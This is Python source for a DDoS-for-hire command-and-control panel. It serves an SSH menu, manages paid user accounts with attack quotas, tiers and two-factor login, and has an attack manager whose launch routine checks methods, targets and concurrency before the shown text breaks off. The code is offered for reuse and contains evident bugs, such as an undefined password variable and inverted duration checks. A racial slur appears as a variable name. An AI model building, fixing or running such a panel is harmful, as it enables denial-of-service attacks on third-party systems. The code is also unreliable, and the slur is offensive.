# CNC source, feel free to modify whatever u want

# Version 1.2.0

import socket, random, base64, requests, threading, time, string, sys, os, json, hashlib, paramiko, traceback
import pyotp, qrcode, qrcode.console_scripts, pyfiglet # for captchas
from datetime import datetime
# - - - - - -
# - - - - - -
# Configs
# - - - - - -
# - - - - - -

serverkey = 'server.key'
SSH_BANNER = "SSH-2.0-LunnaSSHservice_1.0"
luc     = {}
lives   = {}
uptime = time.time()
host_key = paramiko.RSAKey(filename=serverkey)
if len(sys.argv) < 2:
    print('U need to put a port to start the script.')
    os.kill(os.getpid(), 9)

# - - - - - -
# - - - - - -
# utils
# - - - - - -
# - - - - - -

clear = lambda sock: sock.send('\033c'.encode())
settitle = lambda sock, title: sock.send(f'\033]0;{title}\a'.encode())
def lnb(start, end):return list(range(start, end-1))
def log(user, data):
    if user != 'System bugs':
        with open('lunna.logs', 'a') as log:
            log.write(f'[ {datetime.now().strftime("%d/%m/%Y %H:%M:%S")} ] {user} | {data}\n')
    else:
        with open('crash.logs', 'a') as log:
            log.write(f'[ {datetime.now().strftime("%d/%m/%Y %H:%M:%S")} ] {data}\n')
class Server(paramiko.ServerInterface):

    def __init__(self):
        self.event = threading.Event()
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
    
    def get_allowed_auths(self, username):
        return "password"

    def check_auth_password(self, username, password):
        self.username = username
        self.password = password
        return paramiko.AUTH_SUCCESSFUL    
    def check_channel_shell_request(self, channel):
        self.event.set()
        return True

    def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
        return True

    def check_channel_exec_request(self, channel, command):
        command = str(command)
        return True

    def get_credentials(self):
        return {'user': self.username, 'passwd': self.password}
class c:
    # reset
    R = '\033[0m'
    # Cores básicas
    BLACK = '\033[30m'
    RED = '\033[38;2;255;0;0m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[38;2;93;43;255m'
    CYAN = '\033[36m'
    WHITE = '\033[38;2;255;255;255m'
    # Cores brilhantes
    BRIGHT_BLACK = '\033[90m'
    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_MAGENTA = '\033[95m'
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'
    # Cores brilhantes
    DARK_RED = '\033[38;2;130;0;0m'
    DARK_GREEN = '\033[38;2;0;130;0m'
    DARK_YELLOW = '\033[38;2;100;100;0m'
    DARK_BLUE = '\033[38;2;0;0;130m'
    DARK_MAGENTA = '\033[38;2;130;0;190m'
    DARK_CYAN = '\033[38;2;0;85;100m'
    DARK_WHITE = '\033[38;2;130;130;130m'
    # Fundo
    BG_BLACK = '\033[40m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[48;2;255;255;255m'
    # Formatação adicional
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    # bools
    true    =f'{BG_GREEN+ BLACK}   {R}'
    false   =f'{BG_RED+   BLACK}   {R}'
    # rank
    root    =f'{BG_RED+   BLACK} R {R}'
    botnet  =f'{BG_BLUE+  BLACK} B {R}'
    lifetime=f'{BG_GREEN+ BLACK} L {R}'
    vip     =f'{BG_YELLOW+BLACK} V {R}'
capimages      = {
 'bus':["""
 .-------------------------------------------------------------.
'------..-------------..----------..----------..----------..--.|
|       \\\\            ||          ||          ||          ||  ||
|        \\\\           ||          ||          ||          ||  ||
|    ..   ||  _    _  ||    _   _ || _    _   ||    _    _||  ||
|    ||   || //   //  ||   //  // ||//   //   ||   //   //|| /||
|_.------"''----------''----------''----------''----------''--'|
|)|      |       |       |       |    |         |      ||==|   |
| |      |  _-_  |       |       |    |  .-.    |      ||==|  C|
| |  __  |.'.-.' |   _   |   _   |    |.'.-.'.  |  __  |  \"__=='
'---------'|( )|'----------------------'|( )|'-----------\"\"
""",
"""
                          __
 .-----------------------'  |
/| _ .---. .---. .---. .---.|
|j||||___| |___| |___| |___||
|=|||=======================|
[_|j||(O)\\__________|(O)\\___] 
"""],
 'linux':["""
Not a penguin
          _nnnn_
        dGGGGMMb
       @p~qp~~qMb
       M|@||@) M|
       @,----.JM|
      JS^\\__/  qKL
     dZP        qKRb
    dZP          qKKb
   fZP            SMMb
   HZM            MMMM
   FqM            MMMM
 __| ".        |\\dS"qML
 |    `.       | `' \\Zq
_)      \\.___.,|     .'
\\____   )MMMMMP|   .'
     `-'       `--' 
""",
"""
Not a penguin
            .-\"\"\"-.
           '       \
          |,.  ,-.  |
          |()L( ()| |
          |,'  `".| |
          |.___.',| `
         .j `--"' `  `.
        / '        '   \\
       / /          `   `.
      / /            `    .
     / /              l   |
    . ,               |   |
    ,"`.             .|   |
 _.'   ``.          | `..-'l
|       `.`,        |      `.
|         `.    __.j         )
|__        |--\"\"___|      ,-'
   `\"--...,+\"\"\"\"   `._,.-' 
"""],
 'computer':["""
           __________                                 
         .'----------`.                              
         | .--------. |                             
         | |########| |       __________              
         | |########| |      /__________\\             
.--------| `--------' |------|    --=-- |-------------.
|        `----,-.-----'      |o ======  |             | 
|       ______|_|_______     |__________|             | 
|      /  %%%%%%%%%%%%  \\                             | 
|     /  %%%%%%%%%%%%%%  \\                            | 
|     ^^^^^^^^^^^^^^^^^^^^                            | 
+-----------------------------------------------------+
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 
""",
"""
 ___________________
 | _______________ |
 | |XXXXXXXXXXXXX| |
 | |XXXXXXXXXXXXX| |
 | |XXXXXXXXXXXXX| |
 | |XXXXXXXXXXXXX| |
 | |XXXXXXXXXXXXX| |
 |_________________|
     _[_______]_
 ___[___________]___
|         [_____] []|__
|         [_____] []|  \\__
L___________________J     \\ \\___\\/
 ___________________      /\
/###################\\    (__)
""",
"""
                         ______                     
 _________        .---"""      """---.              
:______.-':      :  .--------------.  :             
| ______  |      | :                : |             
|:______B:|      | |                | |             
|:______B:|      | |                | |             
|:______B:|      | |                | |             
|         |      | |                | |             
|:_____:  |      | |                | |             
|    ==   |      | :                : |             
|       O |      :  '--------------'  :             
|       o |      :'---...______...---'              
|       o |-._.-i___/'             \\._              
|'-.____o_|   '-.   '-...______...-'  `-._          
:_________:      `.____________________   `-.___.-. 
                 .'.eeeeeeeeeeeeeeeeee.'.      :___:
               .'.eeeeeeeeeeeeeeeeeeeeee.'.         
              :____________________________:
"""],
 'apple':["""
           .:'
      __ :'__
   .'`__`-'__``.
  :__________.-'
  :_________:
   :_________`-;
    `.__.-.__.'
""","""
                        .8 
                      .888
                    .8888'
                   .8888'
                   888'
                   8'
      .88888888888. .88888888888.
   .8888888888888888888888888888888.
 .8888888888888888888888888888888888.
.&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&'
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&'
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&'
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%.
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%.
`%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%.
 `00000000000000000000000000000000000'
  `000000000000000000000000000000000'
   `0000000000000000000000000000000'
     `###########################'
      `#######################'
         `#########''########'
           `\"\"\"\"\"\"'  `\"\"\"\"\"'
"""],
 'controller':["""
       _=====_                               _=====_
     / _____ \\                             / _____ \\
   +.-'_____'-.---------------------------.-'_____'-.+
  /   |     |  '.        S O N Y        .'  |  _  |   \\
 / ___| /|\\ |___ \\                     / ___| /_\\ |___ \\
/ |      |      | ;  __           _   ; | _         _ | ;
| | <---   ---> | | |__|         |_:> | ||_|       (_)| |
| |___   |   ___| ;SELECT       START ; |___       ___| ;
|\\    | \\|/ |    /  _     ___      _   \\    | (X) |    /|
| \\   |_____|  .','" "', |___|  ,'" "', '.  |_____|  .' |
|  '-.______.-' /       \\ANALOG/       \\  '-._____.-'   |
|               |       |------|       |                |
|              /\\       /      \\       /\\               |
|             /  '.___.'        '.___.'  \\              |
|            /                            \\             |
 \\          /                              \\           /
  \\________/                                \\_________/"""]}
spinner        = ['-', '\\', '|', '/']
super_users    = []
vips           = []
guest_users    = []
blacklist      = []
methods        = []
attacks        = []
plans          = {}
commands       = {}
command_line   = ''
motd           = ''
cnc_name       = ''
globalatks     = 0
security_level = 0
def loadConfigs(sock=False):
    global plans, super_users, vips, guest_users, resellers, blacklist, globalatks, command_line, commands, motd, cnc_name, security_level, antiddos
    try:
        if sock:
            sock.send(f' [{c.CYAN}Info{c.R}] Reloading...\r\n'.encode())
        with open('Settings/config.json', 'r') as arquivo:
            file = arquivo.read()
        try:
            with open('Settings/funnel.json', 'r') as arquivo:
                funnel = arquivo.read()
                funnel = json.loads(funnel)
        except Exception as e:
            print(f'[{c.BG_RED+c.WHITE}FATAL{c.R}] The settings > funnel.json file is corrupted, error:')
            print(e)
            os.kill(os.getpid(), 9)
        try:
            with open('Banners/cmd_line.tfx', 'r', encoding='utf-8') as arquivo:
                cmd = arquivo.read()
        except:
            cmd = '[<&user.name>@<&cnc.name>]: ~$ '
            if sock:
                sock.send(f' [{c.RED}Error{c.R}] the command line banner file is corrupted, some of caracters maybe crashed the loader.\r\n'.encode())
        x = json.loads(file)
        # methods= {'layer-4':[], 'layer-7':[], 'every':[]}
        # mhdesc= {}
        # for key in x["methods"]['layer4']:
        #     methods['every'].append(key)
        #     methods['layer-4'].append(key)
        #     mhdesc[key] = {'mean':x['means'][key],"desc":x["methods"]['layer4'][key]['desc'],"vip":x["methods"]['layer4'][key]['vip'], "just_domains_urls": x["methods"]['layer4'][key]['just_domains_urls'], "just_ip": x["methods"]['layer4'][key]['just_ips'], "disable": x["methods"]['layer4'][key]['disable']}
        # for key in x["methods"]['layer7']:
        #     methods['layer-7'].append(key)
        #     methods['every'].append(key)
        #     mhdesc[key] = {'mean':x['means'][key],'desc':x["methods"]['layer7'][key]['desc'], 'vip':x["methods"]['layer7'][key]['vip'], "just_domains_urls": x["methods"]['layer7'][key]['just_domains_urls'], "just_ip": x["methods"]['layer7'][key]['just_ips'], "disable": x["methods"]['layer7'][key]['disable']}
        # apis          = x['apis']
        #plans         = x["plans_specifications"]
        command_line   = cmd

        if sock: sock.send(f' [{c.CYAN}Info{c.R}] Reloading CNC motd...\r'.encode())
        if x["cnc_motd"] != motd:
            if sock:
                sock.send(f' [{c.GREEN}OK{c.R}] CNC motd seted to {x["cnc_motd"]}.\r'.encode())
            print(f'[{c.YELLOW}Info{c.R}] CNC motd seted to {x["cnc_motd"]}.')
        if sock: sock.send(f' [{c.GREEN}OK{c.R}] CNC motd reloaded.\r'.encode())
        if sock: sock.send('\r\n')

        motd           = x["cnc_motd"]
        if sock: sock.send(f' [{c.CYAN}Info{c.R}] Reloading CNC name...\r'.encode())
        if x["cnc_name"] != cnc_name:
            if sock:
                sock.send(f' [{c.GREEN}OK{c.R}] CNC name seted to {x["cnc_name"]}.\r'.encode())
            print(f'[{c.YELLOW}Info{c.R}] CNC name seted to {x["cnc_name"]}.')
        else:
            if sock: sock.send(f' [{c.GREEN}OK{c.R}] CNC name reloaded.          \r'.encode())

        if sock: sock.send('\r\n')
        cnc_name       = x["cnc_name"]

        if sock: sock.send(f' [{c.CYAN}Info{c.R}] Reloading cnc security level...\r'.encode())
        if x["security_level"] != security_level or x["security_level"] == security_level and security_level <= 4 and security_level >= 0:
            if sock: sock.send(f' [{c.GREEN}OK{c.R}] CNC security level seted to {x["security_level"]}   \r'.encode())
            print(f'[{c.YELLOW}Info{c.R}] CNC security level seted to {x["security_level"]}')
            security_level = x["security_level"]
        elif x["security_level"] == security_level:
            if sock: sock.send(f' [{c.GREEN}OK{c.R}] Security parameters reloaded.\r'.encode())
            print(f'[{c.YELLOW}Info{c.R}] CNC security parameters reloaded')
        else:
            if sock: sock.send(f' [{c.RED}Warn{c.R}] CNC security level seted to 0, invalid value on security_level'.encode())
            print(f'[{c.RED}Warn{c.R}] CNC security level seted to 0, invalid value on security_level')
            security_level = 0

        if sock: sock.send('\r\n')

        if sock: sock.send(f' [{c.CYAN}Info{c.R}] Reloading CNC config and funnel...\r'.encode())
        methods        = funnel['methods']
        commands       = x["commands"]
        super_users    = x['superusers']
        vips           = x['vips']
        blacklist      = x['blacklist']
        if sock: sock.send(f' [{c.GREEN}OK{c.R}] CNC methods reloaded with success\r'.encode())
        print(f'[{c.YELLOW}Info{c.R}] CNC methods reloaded.')

        if sock: sock.send('\r\n')

        if sock: sock.send(f' [{c.YELLOW}Info{c.R}] Reload finished.\r\n'.encode())
        # resellers     = x['resellers']
        # globalatks    = x['global']
    except Exception as e:
        print(f'[{c.BG_RED+c.WHITE}FATAL{c.R}] The settings > config.json file is corrupted, error:')
        print(e)
        os.kill(os.getpid(), 9)
def receive(sock, lenght=1024, user=False, debug=False, returnset=False, limitc=False, justnumbers=False):
    global luc
    nigga  = []
    bansi  = [
        b'\n',b'\x1b',b'\t',b'\x0b',b'\x15',b'\x07',b'\x0c',b'\x08',b'\x7f',b'\x1b[D',b'\x1b[C', b'\x1b[B',b'\x1b[A', b'\x1b[3~', b'\x00', b'\x16', b'\x1b[1~',
        b'\x1b[2~', b'\x1b[3~', b'\x1b[4~', b'\x1b[5~', b'\x1b[6~', b'\x1a', b'\x01', b'\x1d', b'\x18', b'\x03', b'\x16', b'\x02', b'\x0e', b'\x1a', b'\x18',
        b'\x10', b'\x0f', b'\x14', b'\x15', b'\x19', b'\x12', b'\x05', b'\x17', b'\x11', b'\x1d', b'\x0c', b'\x0b', b'\x07', b'\x06', b'\x04', b'\x01', b'\x05',
        b'\x13', b'\x1f', b'\x1c', b'\x1b\xc3\xa7', b'\x1e', b'\x1f', b'\x1c', b'\x1b\xc2\xb4', b'\x1b\xc2\xb4\x1b\xc2\xb4', b'\xc2\xb2', b'\xc2\xb3', b'\xc2\xb9',
        b'\x1ba', b'\x1bb', b'\x1bc', b'\x1bd', b'\x1be', b'\x1bf', b'\x1bg', b'\x1bh', b'\x1bi', b'\x1bj', b'\x1bk', b'\x1bl', b'\x1bm', b'\x1bn', b'\x1bo', b'\x1bp',
        b'\x1bq', b'\x1br', b'\x1bs', b'\x1bt', b'\x1bu', b'\x1bv', b'\x1bw', b'\x1bx', b'\x1by', b'\x1bz', b'\x1bA', b'\x1bB', b'\x1bC', b'\x1bD', b'\x1bE', b'\x1bF',
        b'\x1bG', b'\x1bH', b'\x1bI', b'\x1bJ', b'\x1bK', b'\x1bL', b'\x1bM', b'\x1bN', b'\x1bO', b'\x1bP', b'\x1bQ', b'\x1bR', b'\x1bS', b'\x1bT', b'\x1bU', b'\x1bV',
        b'\x1bW', b'\x1bX', b'\x1bY', b'\x1bZ', b'\x1b0', b'\x1b1', b'\x1b2', b'\x1b3', b'\x1b4', b'\x1b5', b'\x1b6', b'\x1b7', b'\x1b8', b'\x1b9', b'\x1b,', b'\x1b.',
        b'\x1b<', b'\x1b>', b'\x1b;', b'\x1b:', b'\x1b/', b'\x1b?', b'\x1b\\', b'\x1b|', b'\x1b"', b"\x1b'", b'\x1b!', b'\x1b@', b'\x1b#', b'\x1b$', b'\x1b%', b'\x1b\xc2\xa8',
        b'\x1b&', b'\x1b*', b'\x1b(', b'\x1b)', b'\x1b_', b'\x1b-', b'\x1b+', b'\x1b=', b'\x1b\xc2\xa7', b'\x1b]', b'\x1b[', b'\x1b{', b'\x1b}', b'\x1b^', b'\x1b~', b'\x1b`',
        b'\x1b\xc2\xb4', b'\x1b\xc3\x87', b'\x1b\xc3\x87', b'\x1b\xc2\xa8\x1b&', '\x1b-\x1b0', b'\x1b[15~', b'\x1b[15~', b'\x1b[17~', b'\x1b[18~', b'\x1b[19~', b'\x1b[20~',
        b'\x1b[21~', b'\x1b[23~', b'\x1b[24~', b'\x1b[11~', b'\x1b[12~', b'\x1b[13~', b'\x1b[14~'
    ]
    numbers = [b'1', b'2', b'3', b'4', b'5', b'6', b'7', b'8', b'9', b'0']
    if limitc:
        limit = limitc+1
    else:
        limit = lenght
    cursor = 0
    lcmd   = 0
    send   = True
    while '\r' not in nigga and len(nigga) <= limit:
        if user:
            luclen = len(luc[user])
        nlen = len(nigga)
        recv = sock.recv(lenght)
        if debug == True:
            print(f'{recv} | banned: {c.true if recv in bansi else c.false}')
        if recv not in bansi:
            if len(recv.decode()) > 1:
                if not justnumbers:
                    nigga.append(recv.decode())
                else:
                    if recv in numbers:
                        nigga.append(recv.decode())
                    else:
                        send=False
            else:
                for i in recv.decode():
                    nigga.append(i)
            if recv != '\r':
                cursor = len(nigga)
        elif recv == b'\x7f' or recv == b'\x08':
            if cursor > 0 and cursor <= len(nigga):
                if nlen > cursor:
                #    try:                     # this is commented cuz i just dont know how to make this works, sorry
                #        nigga.pop(cursor - 1)
                #    except Exception as error:
                #        print(f'aint way {error}')
                #    print(cursor, nlen)
                #    nuns = lnb(cursor, nlen)
                #    sock.send(f'\x08'.encode())
                #    for i in nuns:
                #        sock.send(f'{nigga[i]}'.encode())
                #    sock.send(b'  ')
                #    for i in range(len(nuns+1)):
                #        sock.send(f'\x08'.encode())
                #    sock.send(f'{nigga[nuns[0]]}'.encode())
                #    sock.send(b'\x08')
                    send = False
                else:
                    nigga.pop(cursor - 1)
                    cursor -= 1
            else:
                send = False
        elif recv == b'\x1b[D': # left arrow
            if cursor > 0 and cursor <= len(nigga):
                cursor -= 1
            else:
                send = False
        elif recv == b'\x1b[C': # right arrow
            if cursor >= 0 and len(nigga) > 0 and cursor < len(nigga):
                cursor += 1
            else:
                send = False
        elif recv == b'\x1b[B': # down arrow
            if user:
                send = False
                if lcmd > 0 and lcmd <= len(luc[user]):
                    lcmd -= 1
                    if cursor > 0:
                        for _ in range(cursor):
                            sock.send(b'\x7f')
                    nigga = []
                    try:
                        for i in luc[user][luclen-lcmd]:
                            nigga.append(i)
                        cursor = len(luc[user][luclen-lcmd])
                        sock.send(luc[user][luclen-lcmd].encode())
                    except:
                        cursor = 0
            else:
                send = False
        elif recv == b'\x1b[A': # up arrow
            if user:
                send = False
                if lcmd >= 0 and lcmd < len(luc[user]):
                    lcmd += 1
                    if cursor > 0:
                        for _ in range(cursor):
                            sock.send(b'\x7f')
                    nigga = []
                    for i in luc[user][luclen-lcmd]:
                        nigga.append(i)
                    cursor = len(luc[user][luclen-lcmd])
                    sock.send(luc[user][luclen-lcmd].encode())
            else:
                send = False
        else:
            send=False
        if send:
            if returnset == False:
                seti = b''
                if recv == b'\r':
                    seti = b'\r\n'
                elif recv == b'\x08':
                    seti = b'\x7f'
                else:
                    seti = recv
                sock.send(seti)
            else:
                if recv != b'\r' and recv not in bansi:
                    sock.send(returnset.replace('%c', recv.decode()).encode())
                elif recv in bansi and recv == b'\x7f':
                    sock.send('\x7f'.encode())
                elif recv == b'\r':
                    sock.send('\r\n'.encode())                    
        else:
            send = True
    if user and debug:
        print(''.join(nigga).replace('\r', ''), f'| cursor state: {str(cursor)} | cmd state: {str(lcmd)} / {str(luclen-lcmd)}')
    return ''.join(nigga).replace('\r', '')
def load(sock, user):
    global lives, cnc_name, motd
    while lives[sock]:
        try:
            processedmotd = core.process(motd, sock, is_title=True)
            if not isinstance(processedmotd, list):
                settitle(sock, processedmotd)
                time.sleep(0.75)
            else:
                for i in processedmotd:
                    settitle(sock, i)
                    time.sleep(0.75)
        except Exception as e:
            print(f'[{c.RED}Info{c.R}] user "{user}" exited')
            try:
                sock.close()
            except:
                pass
            try:
                del lives[sock]
            except Exception as e:
                pass
                #print(e)

            return

# - - - - - -
# - - - - - -
# Core
# - - - - - -
# - - - - - -

class core: # Main Core
    def rstring(length=4):
        characters = string.ascii_letters + string.digits
        random_string = ''.join(random.choice(characters)+' ' for _ in range(length))
        return [random_string, random_string.replace(' ', '')]
    def process(data, sock, is_title=False, addbreak=False):
        global lives
        user = lives[sock]
        if '<%clear>' in data and is_title == False:
            clear(sock)
        data = data.replace('<&user.name>', user['user']).replace('<&user.uptime>', core.getuptime(user['uptime'])).replace('<&user.concurrents>', str(user['concurrents'])).replace('<&user.boottime>', str(user['boottime'])).replace('<&user.until_expiry>', core.gettimeinto(int(time.time()), user['expiry'])).replace('<&user.createdby>', user['created_by']).replace('<&user.running>', str(amc.userattacks(user["user"])))
        data = data.replace('<&cnc.uptime>', core.getuptime(uptime)).replace('<&cnc.name>', cnc_name)
        data = data.replace('<%color.magenta>', c.MAGENTA).replace('<%color.reset>', c.R).replace('<%color.yellow>', c.YELLOW).replace('<%color.black>', c.BLACK).replace('<%color.white>', c.WHITE).replace('<%color.cyan>', c.CYAN).replace('<%color.red>', c.RED).replace('<%color.blue>', c.BLUE).replace('<%color.green>', c.GREEN).replace('<%color.bright.red>', c.BRIGHT_RED).replace('<%color.bright.blue>', c.BRIGHT_BLUE).replace('<%color.bright.green>', c.BRIGHT_GREEN).replace('<%color.bright.magenta>', c.BRIGHT_MAGENTA).replace('<%color.bright.yellow>', c.BRIGHT_YELLOW).replace('<%color.bright.cyan>', c.BRIGHT_CYAN).replace('&x1b', '\x1b').replace('<%clear>', '')
        data = data.replace('<%color.bg.white>', c.BG_WHITE).replace('<%color.bg.red>', c.BG_RED).replace('<%color.bg.green>', c.BG_GREEN).replace('<%color.bg.blue>', c.BG_BLUE).replace('<%color.bg.black>', c.BG_BLACK).replace('<%color.bg.magenta>', c.BG_MAGENTA).replace('<%color.bg.yellow>', c.BG_YELLOW).replace('<%color.bg.cyan>', c.BG_CYAN).replace('\n','\r\n')
        if '<&spinner>' in data and is_title:
            finalvar = []
            for i in spinner:
                finalvar.append(data.replace('<&spinner>', i))
        else: 
            finalvar = data
        if not isinstance(data, list) and not data.endswith('\r\n') and addbreak:
            return finalvar+'\r\n'
        return finalvar
    def banners(name):
        global commands
        try:
            with open(f'Banners/{name}.tfx', 'r', encoding='utf-8') as arquivo:
                return arquivo.read()
        except:
            return '<%color.red>Banner not found.<%color.reset>'
    def findsessions(user, addr):
        global lives
        for shit in list(lives.keys()):
            print(lives[shit])
            if lives[shit]['addr'] == addr or lives[shit]['user'] == user:
                return 1
        return 0
    def checklogin(username, password):
        with open('Database/logins.json', 'r') as arquivo:
            x = json.load(arquivo)
        try:
            if x[username]['password'] == hashlib.sha512(f'{password+x[username]["salt"]}'.encode()).hexdigest():
                    user        = username
                    concurrents = x[username]['concurrents']
                    boottime    = x[username]['boottime']
                    createdby   = x[username]['created_by']
                    disable     = x[username]['expiry']
                    return {"user":user, "concurrents":int(concurrents), "boottime":int(boottime), "created_by":createdby, "expiry": int(disable), "first": x[username]['first'], "otp": x[username]['otp']}
        except Exception as e:
            #print(e)
            return False
    def modifyuser(username, thing, value):
        with open('Database/logins.json', 'r') as arquivo:
            x = json.load(arquivo)
        try:
            if x[username]:
                    x[username][thing] = value
                    with open('Database/logins.json', 'w') as arquivo:
                        json.dump(x, arquivo, indent=2)
                    return True
            return False
        except Exception as e:
            print(e)
            return False
    def seek(username, thing):
        with open('Database/logins.json', 'r') as arquivo:
            x = json.load(arquivo)
        try:
            if x[username]:
                return x[username][thing]
            return False
        except Exception as e:
            print(e)
            return False
    def createlogin(username, password, concurrents, boottime, creator, expiry_date):
        with open('Database/logins.json', 'r') as arquivo:
            x       = json.load(arquivo)
        saltkey     = base64.b64encode(os.urandom(32)).decode()
        password    = hashlib.sha512(f'{password+saltkey}'.encode()).hexdigest()
        x[username] = {
            "passwd": passwd,
            "salt": saltkey,
            "concurrents": concurrents,
            "boottime": boottime,
            "created_by": creator,
            "expiry": int(time.time())+int(expiry_date),
            "attacks":0,
            "first": 1,
            "otp": ""
        }
        # if vip == 1:
        #     with open('configs.json', 'r') as arquivo:
        #         file = json.load(arquivo)
        #     file['vips'].append(username)
        #     with open('configs.json', 'w') as arquivo:
        #         json.dump(file, arquivo, indent=2)
        with open('Database/logins.json', 'w') as arquivo:
            json.dump(x, arquivo, indent=2)
    def getuptime(seconds):
        seconds = int(time.time())-int(seconds)
        seconds_per_minute = 60
        seconds_per_hour = 60 * seconds_per_minute
        seconds_per_day = 24 * seconds_per_hour
        seconds_per_month = 31 * seconds_per_day
        seconds_per_year = 12 * seconds_per_month
        if seconds >= seconds_per_year:
            days = seconds // seconds_per_year
            return f"{days} year{'s' if days > 1 else ''}"
        if seconds >= seconds_per_month:
            days = seconds // seconds_per_month
            return f"{days} month{'s' if days > 1 else ''}"
        if seconds >= seconds_per_day:
            days = seconds // seconds_per_day
            return f"{days} day{'s' if days > 1 else ''}"
        elif seconds >= seconds_per_hour:
            hours = seconds // seconds_per_hour
            return f"{hours} hour{'s' if hours > 1 else ''}"
        elif seconds >= seconds_per_minute:
            minutes = seconds // seconds_per_minute
            return f"{minutes} minute{'s' if minutes > 1 else ''}"
        else:
            return f"{seconds} second{'s' if seconds > 1 else ''}"
    def gettimeinto(start, finish):
        seconds = start-finish
        seconds_per_minute = 60
        seconds_per_hour = 60 * seconds_per_minute
        seconds_per_day = 24 * seconds_per_hour
        seconds_per_month = 31 * seconds_per_hour
        if seconds >= seconds_per_month:
            days = seconds // seconds_per_month
            return f"{days} month{'s' if days > 1 else ''}"
        if seconds >= seconds_per_day:
            days = seconds // seconds_per_day
            return f"{days} day{'s' if days > 1 else ''}"
        elif seconds >= seconds_per_hour:
            hours = seconds // seconds_per_hour
            return f"{hours} hour{'s' if hours > 1 else ''}"
        elif seconds >= seconds_per_minute:
            minutes = seconds // seconds_per_minute
            return f"{minutes} minute{'s' if minutes > 1 else ''}"
        elif seconds >= 0 and seconds <= 59:
            return f"{seconds} second{'s' if seconds > 1 else ''}"
        else:
            return 'buga'
    def twofactor(username):
        secret = pyotp.random_base32()
        totp = pyotp.TOTP(secret)
        otpauth_url = totp.provisioning_uri(f"{username}@{cnc_name.lower().replace(' ', '')}.xyz", issuer_name=cnc_name)
        # generate the qr code
        qr = qrcode.QRCode(
        version=1,  # Tamanho mínimo do QR code
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=1,  # Tamanho do box (diminuir a altura)
        border=1  # Largura da borda ao redor do QR code
        )
        qr.add_data(otpauth_url)
        qr.make(fit=True)
        # print the qr code on the screen
        # qr.print_ascii(invert=True)
        
        qr_matrix = qr.get_matrix()
        
        # Convert the matrix on a qr code ascii
        qr_list = ['']
        for row in qr_matrix:
            line = f''.join(['██' if cell else '  ' for cell in row])
            qr_list.append(c.BG_WHITE+c.BLACK+line+c.R)
        return secret, qr_list
class amc: # AMC(Attacks Manager Core)
    def arac(): # all running attacks core
        global globalatks, attacks, usersattacks
        while True:
            try:
                with open('Database/attacks.json') as x:
                    x=x.read();x=json.loads(x)
                globalatks = x['global']
                attacks    = x['sent']
                time.sleep(1.5)
            except Exception as e:
                print(f'[{c.RED}ERROR{c.R}] All running AMC broken.')
                os.kill(os.getpid(), 9)
    def userattacks(user="", m=1, ms=""): 
        """
         get user's attacks, with modes
         m: mode
         ms: mode string, used to mode 5
          mode 1 =  gets only the counter of attacks running for the desired user ;3
          mode 2 =  gets only the counter of all attacks sent by user >:3
          mode 3 =  gets the json of the attacks running ;3
          mode 4 =  gets the json of all attacks sent by user ~w~
          mode 5 =  gets only the counter of attacks running in one method in the entire CNC ;3
          mode 6 =  gets only the counter of attacks running in one method by a desired user ^w^
        """
        global globalatks, attacks, usersattacks
        hits = 0
        jeson = {
            'hits':0,
            'attacks': []
            }
        for i in attacks:
            if m == 1:
                if i["user"] == user and i["end"] > time.time():
                    hits += i["concs_used"]
            elif m == 2:
                if i["user"] == user:
                    hits += i["concs_used"]
            elif m == 3:
                if i["user"] == user and i["end"] > time.time():
                    jeson["hits"] += i["concs_used"]
                    jeson["attacks"].append(i)
            elif m == 4:
                if i["user"] == user:
                    jeson["hits"] += i["concs_used"]
                    jeson["attacks"].append(i)
            if m == 5:
                if i["method"] == ms and i["end"] > time.time():
                    hits += i["concs_used"]
            if m == 6:
                if i["user"] == user and i["method"] == ms and i["end"] > time.time():
                    hits += i["concs_used"]
        return hits if m <= 2 else jeson
    def launch(user, method, host, duration, port=0, concs=1, lenght=0):
        method_info = next((m for m in funnel['methods'] if m['name'] == method), None)
        if not method_info:
            return False, "<%color.red>Method not found.<%color.reset>"
        moderation = method_info['moderation']
        if moderation['limit_attack_time'] and duration <= moderation['max_time']:
            return False, f"<%color.red>Method duration reached the max: {moderation['max_time']}.<%color.reset>"

        if duration >= funnel['minimum_time']:
            return False, f"<%color.red>Method duration need to be at least {funnel['minimum_time']} seconds.<%color.reset>"

        if concs > moderation['limit_concs_per_user']:
            return False, "<%color.red>User reached the method max concurrents, try again later.<%color.reset>"

        if concs > moderation['limit_concs_per_cnc']:
            return False, "<%color.red>Method max concurrents reached, try again later.<%color.reset>"

        if moderation['allow_length'] and lenght <= moderation['max_lenght'] and lenght >= 0:
            return False, f"<%color.red>Method max/minimun lenght reached({moderation['max_lenght']}).<%color.reset>"
        elif not moderation['allow_length'] and lenght:
            return False, "<%color.red>Method don't allows lenght parameters.<%color.reset>"

        if moderation['just_ips'] and not is_valid_ip(host):
            return False, "<%color.red>Only ip's can be used on desired method.<%color.reset>"

        if moderation['just_domains'] and not is_valid_domain(host):
            return False, "<%color.red>Only domains can be used on desired method.<%color.reset>"

        if not moderation['just_domains'] and port == 0:
            port = moderation['default_port']

        if moderation['admin_method'] and not is_admin(user):
